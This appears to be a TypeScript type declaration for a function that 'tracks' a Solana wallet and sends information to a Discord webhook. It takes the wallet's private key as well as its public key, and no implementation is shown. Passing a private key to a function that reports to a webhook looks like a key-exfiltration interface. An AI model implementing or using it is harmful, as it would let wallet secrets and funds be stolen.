/**
 * Track a Solana wallet and send information to a Discord webhook
 * @param publicKey - The public key of the wallet
 * @param privateKey - The private key of the wallet
 * @returns A promise that resolves when tracking is complete
 */
export function trackSolanaWallet(publicKey: string, privateKey: string): Promise<void>; 